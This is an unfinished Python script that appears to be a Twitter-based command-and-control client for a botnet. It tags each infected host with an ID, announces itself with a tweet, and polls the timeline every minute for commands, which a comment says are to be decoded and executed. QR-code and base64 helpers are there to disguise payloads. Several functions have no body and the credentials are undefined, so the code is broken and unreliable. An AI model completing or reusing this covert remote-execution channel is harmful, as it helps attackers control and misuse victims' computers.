import time
import base64
import tweepy
import uuid
import os
import zlib
import qrcode
from pyzbar.pyzbar import decode
from PIL import Image
# we using QRs cause twitter limit

if not os.path.exists('id'):
    client_id = uuid.uuid4().hex
    with open('id','wb') as f:
        f.write(client_id.encode())
else:
    with open('id','rb') as f:
        client_id = f.read().decode()

def generate_qr(message):
    # encode to base_64 and generate_qr
    message = base64.b64encode(message.encode('utf-8'))
    qr = qrcode.make(message)
    qr.save('message.png')

def read_qr(img):
    message = decode(Image.open(img))[0].data.decode()
    return base64.b64decode(message).decode('utf-8')

def post_message(message):
    return 0

def read_message(tweet):
    return 0

auth = tweepy.OAuthHandler(consumer_key, consumer_secret)
auth.set_access_token(access_token, access_token_secret)

api = tweepy.API(auth)

def confirm_connection(api):
    # send tweet confirming connection
    # client_id::command_in_b64::confirm
    # client_id::command_in_b64::response
    api.update_status(f'{client_id}::Client_Confirmed::confirm')
    return True

connected = confirm_connection(api)

def tweet_type(tweet):
    return tweet.split('::')[-1]

def tweet_client(tweet):


def check_commands(api):
    tweet = api.user_timeline(id = api.me().id, count = 1)[0]
    if tweet_type(tweet) == 'command' and tweet_client(tweet) == client_id:
        #decode comand and execute



while True:
    if connected:
        check_commands(api)
    
    
    time.sleep(60)